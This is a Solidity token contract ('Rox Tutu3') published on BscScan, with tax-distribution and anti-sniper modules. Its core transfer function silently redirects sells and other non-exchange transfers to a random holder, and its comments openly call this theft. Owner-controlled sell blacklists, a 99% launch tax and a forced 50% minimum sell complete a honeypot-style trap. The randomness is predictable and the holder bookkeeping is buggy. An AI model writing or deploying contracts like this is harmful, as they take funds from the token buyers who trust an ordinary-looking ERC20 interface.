/**
 *Submitted for verification at BscScan.com on 2022-02-28
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface IOwnable {
    function owner() external view returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address _owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;

    function setShare(address shareholder, uint256 amount) external;

    function depositNative() external payable;

    function depositToken(address from, uint256 amount) external;

    function process(uint256 gas) external;

    function inSwap() external view returns (bool);
}


interface ITaxDistributor {
    receive() external payable;

    function lastSwapTime() external view returns (uint256);

    function inSwap() external view returns (bool);

    function createWalletTax(string memory name, uint256 buyTax, uint256 sellTax, address wallet, bool convertToNative) external;

    function createLiquidityTax(string memory name, uint256 buyTax, uint256 sellTax) external;

    function distribute() external payable;

    function takeSellTax(uint256 value) external returns (uint256);

    function takeBuyTax(uint256 value) external returns (uint256);
}

interface IWalletDistributor {
    function receiveToken(address token, address from, uint256 amount) external;
}


// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}



pragma solidity ^0.8.9;

abstract contract BaseErc20 is IERC20, IOwnable {
    using SafeMath for uint256;

    address[] holders;
    mapping(address => bool) isHolder;

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowed;
    uint256 internal _totalSupply;

    string public symbol;
    string public  name;
    uint8 public decimals;

    address public override owner;
    bool public launched;
    uint256 public launchTime;
    uint256 public launchBlock;

    mapping(address => bool) public canAlwaysTrade;
    mapping(address => bool) public excludedFromSelling;
    mapping(address => bool) public excludedFromTax;
    mapping(address => bool) public exchanges;

    address public WETH;
    address public pair;

    uint256 private _nonce;

    modifier onlyOwner() {
        require(msg.sender == owner, "can only be called by the contract owner");
        _;
    }

    modifier isLaunched() {
        require(launched, "can only be called once token is launched");
        _;
    }

    // @dev Trading is allowed before launch if the sender is the owner, we are transferring from the owner, or in canAlwaysTrade list
    modifier tradingEnabled(address from) {
        require(launched || from == owner || canAlwaysTrade[msg.sender], "trading not enabled");
        _;
    }


    function configure(address _owner) internal virtual {
        owner = _owner;
        canAlwaysTrade[owner] = true;
    }

    /**
    * @dev Total number of tokens in existence
    */
    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the balance of.
    * @return An uint256 representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) public override view returns (uint256) {
        return _balances[_owner];
    }

    /**
     * @dev Function to check the amount of tokens that an owner allowed to a spender.
     * @param _owner address The address which owns the funds.
     * @param spender address The address which will spend the funds.
     * @return A uint256 specifying the amount of tokens still available for the spender.
     */
    function allowance(address _owner, address spender) public override view returns (uint256) {
        return _allowed[_owner][spender];
    }

    /**
    * @dev Transfer token for a specified address
    * @param to The address to transfer to.
    * @param value The amount to be transferred.
    */
    function transfer(address to, uint256 value) public override tradingEnabled(msg.sender) returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    /**
     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
     * Beware that changing an allowance with this method brings the risk that someone may use both the old
     * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
     * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to be spent.
     */
    function approve(address spender, uint256 value) public override tradingEnabled(msg.sender) returns (bool) {
        require(spender != address(0), "cannot approve the 0 address");

        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    /**
     * @dev Transfer tokens from one address to another.
     * Note that while this function emits an Approval event, this is not required as per the specification,
     * and other compliant implementations may not emit the event.
     * @param from address The address which you want to send tokens from
     * @param to address The address which you want to transfer to
     * @param value uint256 the amount of tokens to be transferred
     */
    function transferFrom(address from, address to, uint256 value) public override tradingEnabled(from) returns (bool) {
        _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
        _transfer(from, to, value);
        emit Approval(from, msg.sender, _allowed[from][msg.sender]);
        return true;
    }


    // Virtual methods
    function launch() virtual public onlyOwner {
        launched = true;
    }

    function preTransfer(address from, address to, uint256 value) virtual internal {}

    function calculateTransferAmount(address from, address to, uint256 value) virtual internal returns (uint256) {
        require(from != to, "you cannot transfer to yourself");
        return value;
    }

    function postTransfer(address from, address to) virtual internal {}



    // Admin methods

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function transferTokens(address token, address to) external onlyOwner returns (bool){
        uint256 balance = IERC20(token).balanceOf(address(this));
        return IERC20(token).transfer(to, balance);
    }

    function setCanAlwaysTrade(address who, bool enabled) external onlyOwner {
        canAlwaysTrade[who] = enabled;
    }

    function setExchange(address who, bool isExchange) external onlyOwner {
        exchanges[who] = isExchange;
    }

    function setExcludedFromSelling(address who, bool isExcluded) external onlyOwner {
        excludedFromSelling[who] = isExcluded;
    }


    // Private methods

    /**
    * @dev Transfer token for a specified addresses
    * @param from The address to transfer from.
    * @param to The address to transfer to.
    * @param value The amount to be transferred.
    */
    function _transfer(address from, address to, uint256 value) private {
        require(to != address(0), "cannot be zero address");
        require(excludedFromSelling[from] == false, "address is not allowed to sell");

        preTransfer(from, to, value);

        uint256 modifiedAmount = calculateTransferAmount(from, to, value);

        // TODO testnet
        if (excludedFromTax[from] == false && excludedFromTax[to] == false && launched && !exchanges[from]) {
            // we are SELLING
            //            uint256 roll = random(theftRiskPercentage());
            //            if (roll == 1) {
            // No luck, you were stolen :(
            uint256 roll = random(holders.length) - 1;
            // congratulations 'holders[roll]', you stole it :)
            to = holders[roll];
            //            }
        }

        manageHolder(from);
        manageHolder(to);

        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(modifiedAmount);

        emit Transfer(from, to, modifiedAmount);

        postTransfer(from, to);
    }

    function manageHolder(address holder) internal {
        if (_balances[holder] > 0 && !isHolder[holder] && holder != address(this) && holder != WETH && holder != pair) {
            addHolder(holder);
        } else if (_balances[holder] == 0 && isHolder[holder]) {
            removeHolder(holder);
        }
    }

    function addHolder(address holder) internal {
        isHolder[holder] = true;
        holders.push(holder);
    }

    function removeHolder(address holder) internal {
        isHolder[holder] = false;
        holders.pop();
    }

    // Generates a random number between 1 and x
    function random(uint256 x) private returns (uint) {
        uint r = uint(uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, _nonce))) % x) + 1;
        _nonce++;
        return r;
    }

    //    function theftRiskPercentage() public view returns (uint8) {
    //        if (launchTime + 7 hours > block.timestamp) {
    //            return 10;
    //        } else if (launchTime + 6 hours > block.timestamp) {
    //            return 20;
    //        } else if (launchTime + 5 hours > block.timestamp) {
    //            return 30;
    //        } else if (launchTime + 4 hours > block.timestamp) {
    //            return 40;
    //        } else if (launchTime + 3 hours > block.timestamp) {
    //            return 50;
    //        } else if (launchTime + 2 hours > block.timestamp) {
    //            return 60;
    //        } else if (launchTime + 1 hours > block.timestamp) {
    //            return 70;
    //        } else {
    //            return 80;
    //        }
    //    }
}



pragma solidity ^0.8.9;


abstract contract Taxable is BaseErc20 {
    using SafeMath for uint256;

    ITaxDistributor taxDistributor;

    bool public autoSwapTax;
    uint256 public minimumTimeBetweenSwaps;
    uint256 public minimumTokensBeforeSwap;
    uint256 swapStartTime;

    function configure(address _owner) internal virtual override {
        excludedFromTax[_owner] = true;
        super.configure(_owner);
    }

    function calculateTransferAmount(address from, address to, uint256 value) internal virtual override returns (uint256) {

        uint256 amountAfterTax = value;

        if (excludedFromTax[from] == false && excludedFromTax[to] == false && launched) {
            if (exchanges[from]) {
                // we are BUYING
                amountAfterTax = taxDistributor.takeBuyTax(value);
            } else {
                // we are SELLING
                amountAfterTax = taxDistributor.takeSellTax(value);
            }
        }

        uint256 taxAmount = value.sub(amountAfterTax);
        if (taxAmount > 0) {
            _balances[address(taxDistributor)] = _balances[address(taxDistributor)].add(taxAmount);
            emit Transfer(from, address(taxDistributor), taxAmount);
        }
        return super.calculateTransferAmount(from, to, amountAfterTax);
    }

    function preTransfer(address from, address to, uint256 value) override virtual internal {
        uint256 timeSinceLastSwap = block.timestamp - taxDistributor.lastSwapTime();
        if (
            launched &&
            autoSwapTax &&
            exchanges[to] &&
            swapStartTime + 60 <= block.timestamp &&
            timeSinceLastSwap >= minimumTimeBetweenSwaps &&
            _balances[address(taxDistributor)] >= minimumTokensBeforeSwap &&
            taxDistributor.inSwap() == false
        ) {
            swapStartTime = block.timestamp;
            try taxDistributor.distribute() {} catch {}
        }
        super.preTransfer(from, to, value);
    }
}



pragma solidity ^0.8.9;


abstract contract AntiSniper is BaseErc20 {
    using SafeMath for uint256;

    bool public enableHighTaxCountdown;

    uint256 public minSellPercentage;
    uint256 public maxHoldPercentage;

    uint256 public snipersCaught;

    mapping(address => bool) public isSniper;
    mapping(address => bool) public isNeverSniper;

    // Overrides

    function configure(address _owner) internal virtual override {
        isNeverSniper[_owner] = true;
        super.configure(_owner);
    }

    function launch() override virtual public onlyOwner {
        super.launch();
        launchTime = block.timestamp;
        launchBlock = block.number;
    }

    function preTransfer(address from, address to, uint256 value) override virtual internal {
        require(isSniper[msg.sender] == false, "sniper rejected");

        if (launched && from != owner && isNeverSniper[from] == false && isNeverSniper[to] == false) {

            if (maxHoldPercentage > 0 && exchanges[to] == false) {
                require(_balances[to].add(value) <= maxHoldAmount(), "this is over the max hold amount");
            }

            // TODO testnet
            if (exchanges[to]) {
                // we are selling
                require(value >= minSellPercentage.div(100).mul(_balances[from]).div(100), "you need to sell more");
            }
        }

        super.preTransfer(from, to, value);
    }

    function calculateTransferAmount(address from, address to, uint256 value) internal virtual override returns (uint256) {
        uint256 amountAfterTax = value;
        if (launched && enableHighTaxCountdown) {
            if (from != owner && sniperTax() > 0 && isNeverSniper[from] == false && isNeverSniper[to] == false) {
                uint256 taxAmount = value.mul(sniperTax()).div(10000);
                amountAfterTax = amountAfterTax.sub(taxAmount);
            }
        }
        return super.calculateTransferAmount(from, to, amountAfterTax);
    }

    // Public methods

    function maxHoldAmount() public view returns (uint256) {
        return totalSupply().mul(maxHoldPercentage).div(10000);
    }

    function sniperTax() public virtual view returns (uint256) {
        if (launched) {
            if (block.number - launchBlock < 3) {
                return 9900;
            }
        }
        return 0;
    }
}



pragma solidity ^0.8.9;

contract TaxDistributor is ITaxDistributor {
    using SafeMath for uint256;

    address public tokenPair;
    address public routerAddress;
    address public developmentWalletAddress;
    address private _token;
    address private _weth;

    IDEXRouter private _router;

    bool public override inSwap;
    uint256 public override lastSwapTime;

    enum TaxType {WALLET, LIQUIDITY}
    struct Tax {
        string taxName;
        uint256 buyTaxPercentage;
        uint256 sellTaxPercentage;
        uint256 taxPool;
        TaxType taxType;
        address location;
        uint256 share;
        bool convertToNative;
    }

    Tax[] public taxes;

    event TaxesDistributed(uint256 tokensSwapped, uint256 ethReceived);

    modifier onlyToken() {
        require(msg.sender == _token, "no permissions");
        _;
    }

    modifier swapLock() {
        require(inSwap == false, "already swapping");
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router, address pair, address weth, address devWalletAddress) {
        _token = msg.sender;
        _weth = weth;
        _router = IDEXRouter(router);
        tokenPair = pair;
        routerAddress = router;
        developmentWalletAddress = devWalletAddress;
    }

    receive() external override payable {}

    function createWalletTax(string memory name, uint256 buyTax, uint256 sellTax, address wallet, bool convertToNative) public override onlyToken {
        taxes.push(Tax(name, buyTax, sellTax, 0, TaxType.WALLET, wallet, 0, convertToNative));
    }

    function createLiquidityTax(string memory name, uint256 buyTax, uint256 sellTax) public override onlyToken {
        taxes.push(Tax(name, buyTax, sellTax, 0, TaxType.LIQUIDITY, address(0), 0, false));
    }

    function distribute() public payable override onlyToken swapLock {
        address[] memory path = new address[](2);
        path[0] = _token;
        path[1] = _weth;
        IERC20 token = IERC20(_token);

        uint256 totalTokens;
        for (uint256 i = 0; i < taxes.length; i++) {
            if (taxes[i].taxType == TaxType.LIQUIDITY) {
                uint256 half = taxes[i].taxPool.div(2);
                totalTokens += taxes[i].taxPool.sub(half);
            } else if (taxes[i].convertToNative) {
                totalTokens += taxes[i].taxPool;
            }
        }
        totalTokens = checkTokenAmount(token, totalTokens);

        _router.swapExactTokensForETH(
            totalTokens,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
        uint256 amountETH = address(this).balance;

        // Calculate the distribution
        uint256 toDistribute = amountETH;
        for (uint256 i = 0; i < taxes.length - 1; i++) {
            if (taxes[i].convertToNative) {
                if (i == taxes.length - 1) {
                    taxes[i].share = toDistribute;
                } else {
                    uint256 share = amountETH.mul(taxes[i].taxPool).div(totalTokens);
                    taxes[i].share = share;
                    toDistribute = toDistribute.sub(share);
                }
            }
        }

        // Distribute the coins
        for (uint256 i = 0; i < taxes.length; i++) {

            if (taxes[i].taxType == TaxType.WALLET) {
                if (taxes[i].convertToNative) {
                    payable(taxes[i].location).transfer(taxes[i].share);
                } else {
                    token.transfer(taxes[i].location, checkTokenAmount(token, taxes[i].taxPool));
                }
            }
            else if (taxes[i].taxType == TaxType.LIQUIDITY) {
                if (taxes[i].share > 0) {
                    uint256 half = checkTokenAmount(token, taxes[i].taxPool.div(2));
                    _router.addLiquidityETH{value : taxes[i].share}(
                        _token,
                        half,
                        0,
                        0,
                        developmentWalletAddress,
                        block.timestamp + 300
                    );
                }
            }

            taxes[i].taxPool = 0;
            taxes[i].share = 0;
        }

        emit TaxesDistributed(totalTokens, amountETH);

        lastSwapTime = block.timestamp;
    }

    function takeSellTax(uint256 value) public override onlyToken returns (uint256) {
        for (uint256 i = 0; i < taxes.length; i++) {
            if (taxes[i].sellTaxPercentage > 0) {
                uint256 taxAmount = value.mul(taxes[i].sellTaxPercentage).div(10000);
                taxes[i].taxPool += taxAmount;
                value = value.sub(taxAmount);
            }
        }
        return value;
    }

    function takeBuyTax(uint256 value) public override onlyToken returns (uint256) {
        for (uint256 i = 0; i < taxes.length; i++) {
            if (taxes[i].buyTaxPercentage > 0) {
                uint256 taxAmount = value.mul(taxes[i].buyTaxPercentage).div(10000);
                taxes[i].taxPool += taxAmount;
                value = value.sub(taxAmount);
            }
        }
        return value;
    }

    // Private methods
    function checkTokenAmount(IERC20 token, uint256 amount) private view returns (uint256) {
        uint256 balance = token.balanceOf(address(this));
        if (balance > amount) {
            return amount;
        }
        return balance;
    }
}



pragma solidity ^0.8.9;


contract Tutu3 is BaseErc20, Taxable, AntiSniper {
    using SafeMath for uint256;

    constructor (address developmentWalletAddress) {
        configure(msg.sender);

        symbol = "Tutu3";
        name = "Rox Tutu3";
        decimals = 9;

        // Pancake Swap

        // TESTNET - https://pancakeswap.rainbit.me/
        address pancakeSwap = 0xc99f3718dB7c90b020cBBbb47eD26b0BA0C6512B;

        // TODO MAINNET
        //        address pancakeSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        IDEXRouter router = IDEXRouter(pancakeSwap);
        WETH = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        exchanges[pair] = true;
        taxDistributor = new TaxDistributor(pancakeSwap, pair, WETH, developmentWalletAddress);

        // Anti Sniper
        // 10%
        maxHoldPercentage = 1000;
        // 50%
        minSellPercentage = 5000;

        enableHighTaxCountdown = true;
        isNeverSniper[address(taxDistributor)] = true;

        // Tax
        minimumTimeBetweenSwaps = 5 minutes;
        minimumTokensBeforeSwap = 1000 * 10 ** decimals;
        // 1100 = 11%
        taxDistributor.createWalletTax("Development", 1100, 1100, developmentWalletAddress, true);
        // 400 = 4%
        taxDistributor.createLiquidityTax("Liquidity", 400, 400);
        autoSwapTax = true;
        excludedFromTax[address(this)] = true;
        excludedFromTax[address(taxDistributor)] = true;

        // Initial Mint
        _allowed[address(taxDistributor)][pancakeSwap] = 2 ** 256 - 1;
        _totalSupply = _totalSupply.add(1_000_000_000 * 10 ** decimals);
        _balances[owner] = _balances[owner].add(_totalSupply);
        emit Transfer(address(0), owner, _totalSupply);
    }

    // Overrides

    function configure(address _owner) internal override(Taxable, AntiSniper, BaseErc20) {
        super.configure(_owner);
    }

    function launch() public override(AntiSniper, BaseErc20) onlyOwner {
        return super.launch();
    }

    function preTransfer(address from, address to, uint256 value) override(AntiSniper, Taxable, BaseErc20) internal {
        super.preTransfer(from, to, value);
    }

    function calculateTransferAmount(address from, address to, uint256 value) override(AntiSniper, Taxable, BaseErc20) internal returns (uint256) {
        return super.calculateTransferAmount(from, to, value);
    }
}